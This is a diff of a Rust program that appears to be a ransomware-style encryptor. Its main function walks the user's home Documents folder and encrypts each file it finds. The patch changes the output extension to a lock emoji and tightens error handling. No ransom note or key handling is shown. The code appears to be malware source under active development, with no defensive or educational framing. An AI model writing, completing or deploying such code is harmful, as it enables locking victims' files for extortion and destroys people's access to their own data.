@@ -1,13 +1,11 @@
-use chacha20poly1305::{XChaCha20Poly1305, KeyInit, aead::stream};
 use dirs::home_dir;
-use std::error::Error;
-use std::fs::{self, File};
+use std::fs;
 use std::path::PathBuf;
 use std::io::prelude::*;
 use anyhow::Result;
 use orion::aead;
 
-const ENCRYPTED_EXTENSION: &str	= ".encrypted";
+const ENCRYPTED_EXTENSION: &str	= ".🔒";
 
 fn encrypt_file(path: PathBuf) -> Result<()> {
 	let file_name = path.file_name().unwrap().to_string_lossy();
@@ -32,7 +30,7 @@ fn encrypt_file(path: PathBuf) -> Result<()> {
 	Ok(())
 }
 
-fn main() -> Result<(), Box<dyn Error>> {
+fn main() -> Result<()> {
 	let target_dir = format!(
 		"{}\\Documents",
 		home_dir().unwrap_or("~".into()).to_string_lossy()
@@ -44,7 +42,7 @@ fn main() -> Result<(), Box<dyn Error>> {
 		let path = entry?.path();
 
 		if path.is_file() {
-			encrypt_file(path);
+			encrypt_file(path)?;
 		}
 	}
 
